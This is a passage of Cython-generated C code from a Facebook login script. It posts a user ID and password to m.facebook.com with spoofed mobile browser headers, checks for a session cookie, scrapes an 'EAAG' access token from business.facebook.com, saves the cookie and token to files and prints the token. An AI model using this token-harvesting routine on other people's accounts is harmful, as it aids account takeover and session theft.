      __pyx_t_9 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyUnicode_Type)), __pyx_t_5); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 219, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_9);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = NULL;
      __pyx_t_10 = 0;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_11))) {
        __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_11);
        if (likely(__pyx_t_5)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_11);
          __Pyx_INCREF(__pyx_t_5);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_11, function);
          __pyx_t_10 = 1;
        }
      }
      #if CYTHON_FAST_PYCALL
      if (PyFunction_Check(__pyx_t_11)) {
        PyObject *__pyx_temp[3] = {__pyx_t_5, __pyx_kp_u_name_jazoest_value, __pyx_t_9};
        __pyx_t_8 = __Pyx_PyFunction_FastCall(__pyx_t_11, __pyx_temp+1-__pyx_t_10, 2+__pyx_t_10); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 219, __pyx_L3_error)
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_GOTREF(__pyx_t_8);
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      } else
      #endif
      #if CYTHON_FAST_PYCCALL
      if (__Pyx_PyFastCFunction_Check(__pyx_t_11)) {
        PyObject *__pyx_temp[3] = {__pyx_t_5, __pyx_kp_u_name_jazoest_value, __pyx_t_9};
        __pyx_t_8 = __Pyx_PyCFunction_FastCall(__pyx_t_11, __pyx_temp+1-__pyx_t_10, 2+__pyx_t_10); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 219, __pyx_L3_error)
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_GOTREF(__pyx_t_8);
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
      } else
      #endif
      {
        __pyx_t_7 = PyTuple_New(2+__pyx_t_10); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 219, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_7);
        if (__pyx_t_5) {
          __Pyx_GIVEREF(__pyx_t_5); PyTuple_SET_ITEM(__pyx_t_7, 0, __pyx_t_5); __pyx_t_5 = NULL;
        }
        __Pyx_INCREF(__pyx_kp_u_name_jazoest_value);
        __Pyx_GIVEREF(__pyx_kp_u_name_jazoest_value);
        PyTuple_SET_ITEM(__pyx_t_7, 0+__pyx_t_10, __pyx_kp_u_name_jazoest_value);
        __Pyx_GIVEREF(__pyx_t_9);
        PyTuple_SET_ITEM(__pyx_t_7, 1+__pyx_t_10, __pyx_t_9);
        __pyx_t_9 = 0;
        __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_11, __pyx_t_7, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 219, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_8);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      }
      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
      __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_group); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 219, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_11);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_11))) {
        __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_11);
        if (likely(__pyx_t_8)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_11);
          __Pyx_INCREF(__pyx_t_8);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_11, function);
        }
      }
      __pyx_t_4 = (__pyx_t_8) ? __Pyx_PyObject_Call2Args(__pyx_t_11, __pyx_t_8, __pyx_int_1) : __Pyx_PyObject_CallOneArg(__pyx_t_11, __pyx_int_1);
      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 219, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
      if (PyDict_SetItem(__pyx_t_6, __pyx_n_u_jazoest, __pyx_t_4) < 0) __PYX_ERR(0, 219, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      if (PyDict_SetItem(__pyx_t_6, __pyx_n_u_uid, __pyx_v_user) < 0) __PYX_ERR(0, 219, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_6, __pyx_n_u_flow, __pyx_n_u_login_no_pin) < 0) __PYX_ERR(0, 219, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_6, __pyx_n_u_pass, __pyx_v_pw) < 0) __PYX_ERR(0, 219, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_6, __pyx_n_u_next, __pyx_kp_u_https_developers_facebook_com_to) < 0) __PYX_ERR(0, 219, __pyx_L3_error)
      __pyx_v_das = ((PyObject*)__pyx_t_6);
      __pyx_t_6 = 0;

      
      __pyx_t_6 = __Pyx_PyDict_NewPresized(15); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 220, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      if (PyDict_SetItem(__pyx_t_6, __pyx_n_u_Host, __pyx_kp_u_m_facebook_com) < 0) __PYX_ERR(0, 220, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_6, __pyx_kp_u_cache_control, __pyx_kp_u_max_age_0) < 0) __PYX_ERR(0, 220, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_6, __pyx_kp_u_upgrade_insecure_requests, __pyx_kp_u_1_2) < 0) __PYX_ERR(0, 220, __pyx_L3_error)
      __pyx_t_4 = __Pyx_PyUnicode_Concat(__pyx_kp_u_https, __pyx_v_url); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 220, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      if (PyDict_SetItem(__pyx_t_6, __pyx_n_u_origin, __pyx_t_4) < 0) __PYX_ERR(0, 220, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      if (PyDict_SetItem(__pyx_t_6, __pyx_kp_u_content_type, __pyx_kp_u_application_x_www_form_urlencode) < 0) __PYX_ERR(0, 220, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_6, __pyx_kp_u_user_agent, __pyx_kp_u_Mozilla_5_0_Linux_Android_12_SAM) < 0) __PYX_ERR(0, 220, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_6, __pyx_n_u_accept, __pyx_kp_u_text_html_application_xhtml_xml_2) < 0) __PYX_ERR(0, 220, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_6, __pyx_kp_u_x_requested_with, __pyx_kp_u_mark_via_gp) < 0) __PYX_ERR(0, 220, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_6, __pyx_kp_u_sec_fetch_site, __pyx_kp_u_same_origin) < 0) __PYX_ERR(0, 220, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_6, __pyx_kp_u_sec_fetch_mode, __pyx_n_u_cors) < 0) __PYX_ERR(0, 220, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_6, __pyx_kp_u_sec_fetch_user, __pyx_n_u_empty) < 0) __PYX_ERR(0, 220, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_6, __pyx_kp_u_sec_fetch_dest, __pyx_n_u_document) < 0) __PYX_ERR(0, 220, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_6, __pyx_n_u_referer, __pyx_kp_u_https_m_facebook_com_index_php_n) < 0) __PYX_ERR(0, 220, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_6, __pyx_kp_u_accept_encoding, __pyx_kp_u_gzip_deflate_br) < 0) __PYX_ERR(0, 220, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_6, __pyx_kp_u_accept_language, __pyx_kp_u_en_GB_en_US_q_0_9_en_q_0_8) < 0) __PYX_ERR(0, 220, __pyx_L3_error)
      __pyx_v_header1 = ((PyObject*)__pyx_t_6);
      __pyx_t_6 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_ses); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 221, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_post); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 221, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = __Pyx_PyDict_NewPresized(3); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 221, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_data, __pyx_v_das) < 0) __PYX_ERR(0, 221, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_headers, __pyx_v_header1) < 0) __PYX_ERR(0, 221, __pyx_L3_error)
      if (PyDict_SetItem(__pyx_t_6, __pyx_n_s_allow_redirects, Py_False) < 0) __PYX_ERR(0, 221, __pyx_L3_error)
      __pyx_t_11 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_tuple__21, __pyx_t_6); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 221, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_11);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_v_po = __pyx_t_11;
      __pyx_t_11 = 0;

      
      __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_ses); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 222, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_cookies); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 222, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_get_dict); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 222, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      __pyx_t_4 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
        __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_6);
        if (likely(__pyx_t_4)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
          __Pyx_INCREF(__pyx_t_4);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_6, function);
        }
      }
      __pyx_t_11 = (__pyx_t_4) ? __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_4) : __Pyx_PyObject_CallNoArg(__pyx_t_6);
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 222, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_11);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_12 = (__Pyx_PySequence_ContainsTF(__pyx_n_u_c_user, __pyx_t_11, Py_EQ)); if (unlikely(__pyx_t_12 < 0)) __PYX_ERR(0, 222, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
      __pyx_t_13 = (__pyx_t_12 != 0);
      if (__pyx_t_13) {

        
        __pyx_t_11 = __Pyx_PyDict_NewPresized(8); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 223, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_11);
        if (PyDict_SetItem(__pyx_t_11, __pyx_n_u_Host, __pyx_kp_u_business_facebook_com) < 0) __PYX_ERR(0, 223, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_11, __pyx_kp_u_cache_control, __pyx_kp_u_max_age_0) < 0) __PYX_ERR(0, 223, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_11, __pyx_kp_u_upgrade_insecure_requests, __pyx_kp_u_1_2) < 0) __PYX_ERR(0, 223, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_11, __pyx_kp_u_user_agent, __pyx_kp_u_Mozilla_5_0_Linux_Android_6_0_1) < 0) __PYX_ERR(0, 223, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_11, __pyx_n_u_accept, __pyx_kp_u_text_html_application_xhtml_xml) < 0) __PYX_ERR(0, 223, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_11, __pyx_kp_u_content_type, __pyx_kp_u_text_html_charset_utf_8) < 0) __PYX_ERR(0, 223, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_11, __pyx_kp_u_accept_encoding, __pyx_kp_u_gzip_deflate) < 0) __PYX_ERR(0, 223, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_11, __pyx_kp_u_accept_language, __pyx_kp_u_id_ID_id_q_0_9_en_US_q_0_8_en_q) < 0) __PYX_ERR(0, 223, __pyx_L3_error)
        __pyx_v_headcok = ((PyObject*)__pyx_t_11);
        __pyx_t_11 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_ses); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 224, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_11);
        __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_11, __pyx_n_s_get); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 224, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        __pyx_t_11 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 224, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_11);
        if (PyDict_SetItem(__pyx_t_11, __pyx_n_s_headers, __pyx_v_headcok) < 0) __PYX_ERR(0, 224, __pyx_L3_error)
        __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_tuple__18, __pyx_t_11); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 224, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        __pyx_v_data2 = __pyx_t_4;
        __pyx_t_4 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_re); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 225, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_11);
        __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_11, __pyx_n_s_search); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 225, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_v_data2, __pyx_n_s_text); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 225, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_11);
        __pyx_t_8 = NULL;
        __pyx_t_10 = 0;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
          __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_6);
          if (likely(__pyx_t_8)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
            __Pyx_INCREF(__pyx_t_8);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_6, function);
            __pyx_t_10 = 1;
          }
        }
        #if CYTHON_FAST_PYCALL
        if (PyFunction_Check(__pyx_t_6)) {
          PyObject *__pyx_temp[3] = {__pyx_t_8, __pyx_kp_u_EAAG_w, __pyx_t_11};
          __pyx_t_4 = __Pyx_PyFunction_FastCall(__pyx_t_6, __pyx_temp+1-__pyx_t_10, 2+__pyx_t_10); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 225, __pyx_L3_error)
          __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        } else
        #endif
        #if CYTHON_FAST_PYCCALL
        if (__Pyx_PyFastCFunction_Check(__pyx_t_6)) {
          PyObject *__pyx_temp[3] = {__pyx_t_8, __pyx_kp_u_EAAG_w, __pyx_t_11};
          __pyx_t_4 = __Pyx_PyCFunction_FastCall(__pyx_t_6, __pyx_temp+1-__pyx_t_10, 2+__pyx_t_10); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 225, __pyx_L3_error)
          __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        } else
        #endif
        {
          __pyx_t_7 = PyTuple_New(2+__pyx_t_10); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 225, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_7);
          if (__pyx_t_8) {
            __Pyx_GIVEREF(__pyx_t_8); PyTuple_SET_ITEM(__pyx_t_7, 0, __pyx_t_8); __pyx_t_8 = NULL;
          }
          __Pyx_INCREF(__pyx_kp_u_EAAG_w);
          __Pyx_GIVEREF(__pyx_kp_u_EAAG_w);
          PyTuple_SET_ITEM(__pyx_t_7, 0+__pyx_t_10, __pyx_kp_u_EAAG_w);
          __Pyx_GIVEREF(__pyx_t_11);
          PyTuple_SET_ITEM(__pyx_t_7, 1+__pyx_t_10, __pyx_t_11);
          __pyx_t_11 = 0;
          __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_6, __pyx_t_7, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 225, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        }
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __pyx_v_find_token = __pyx_t_4;
        __pyx_t_4 = 0;

        
        __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_find_token, __pyx_n_s_group); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 226, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_7 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
          __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_6);
          if (likely(__pyx_t_7)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
            __Pyx_INCREF(__pyx_t_7);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_6, function);
          }
        }
        __pyx_t_4 = (__pyx_t_7) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_7, __pyx_int_1) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_int_1);
        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 226, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __pyx_v_token = __pyx_t_4;
        __pyx_t_4 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_convert); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 227, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_ses); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 227, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_11);
        __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_11, __pyx_n_s_cookies); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 227, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_8);
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_get_dict); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 227, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_11);
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        __pyx_t_8 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_11))) {
          __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_11);
          if (likely(__pyx_t_8)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_11);
            __Pyx_INCREF(__pyx_t_8);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_11, function);
          }
        }
        __pyx_t_7 = (__pyx_t_8) ? __Pyx_PyObject_CallOneArg(__pyx_t_11, __pyx_t_8) : __Pyx_PyObject_CallNoArg(__pyx_t_11);
        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
        if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 227, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        __pyx_t_11 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
          __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_6);
          if (likely(__pyx_t_11)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
            __Pyx_INCREF(__pyx_t_11);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_6, function);
          }
        }
        __pyx_t_4 = (__pyx_t_11) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_11, __pyx_t_7) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_7);
        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 227, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __pyx_v_cookie = __pyx_t_4;
        __pyx_t_4 = 0;

        
        __pyx_t_6 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__19, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 228, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_write); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 228, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __pyx_t_6 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_7))) {
          __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_7);
          if (likely(__pyx_t_6)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
            __Pyx_INCREF(__pyx_t_6);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_7, function);
          }
        }
        __pyx_t_4 = (__pyx_t_6) ? __Pyx_PyObject_Call2Args(__pyx_t_7, __pyx_t_6, __pyx_v_cookie) : __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_v_cookie);
        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 228, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

        
        __pyx_t_7 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__15, NULL); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 229, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_7);
        __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_write); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 229, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __pyx_t_7 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
          __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_6);
          if (likely(__pyx_t_7)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
            __Pyx_INCREF(__pyx_t_7);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_6, function);
          }
        }
        __pyx_t_4 = (__pyx_t_7) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_7, __pyx_v_token) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_v_token);
        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 229, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

        
        __pyx_t_13 = (__Pyx_PySequence_ContainsTF(__pyx_n_u_EAA, __pyx_v_token, Py_EQ)); if (unlikely(__pyx_t_13 < 0)) __PYX_ERR(0, 230, __pyx_L3_error)
        __pyx_t_12 = (__pyx_t_13 != 0);
        if (__pyx_t_12) {

          
          __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_prints); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 231, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_Panel); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 231, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_7);
          __pyx_t_11 = __Pyx_PyObject_FormatSimple(__pyx_v_token, __pyx_empty_unicode); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 231, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_11);
          __pyx_t_8 = PyTuple_New(1); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 231, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_8);
          __Pyx_GIVEREF(__pyx_t_11);
          PyTuple_SET_ITEM(__pyx_t_8, 0, __pyx_t_11);
          __pyx_t_11 = 0;
          __pyx_t_11 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 231, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_11);
          if (PyDict_SetItem(__pyx_t_11, __pyx_n_s_title, __pyx_n_u_TOKEN) < 0) __PYX_ERR(0, 231, __pyx_L3_error)
          __pyx_t_9 = __Pyx_PyObject_Call(__pyx_t_7, __pyx_t_8, __pyx_t_11); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 231, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_9);
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
          __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
          __pyx_t_11 = NULL;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_6))) {
            __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_6);
            if (likely(__pyx_t_11)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
              __Pyx_INCREF(__pyx_t_11);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_6, function);
            }
          }
          __pyx_t_4 = (__pyx_t_11) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_11, __pyx_t_9) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_9);
          __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
          __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
          if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 231, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

          
          __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_prints); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 232, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_n_s_Panel); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 232, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_9);
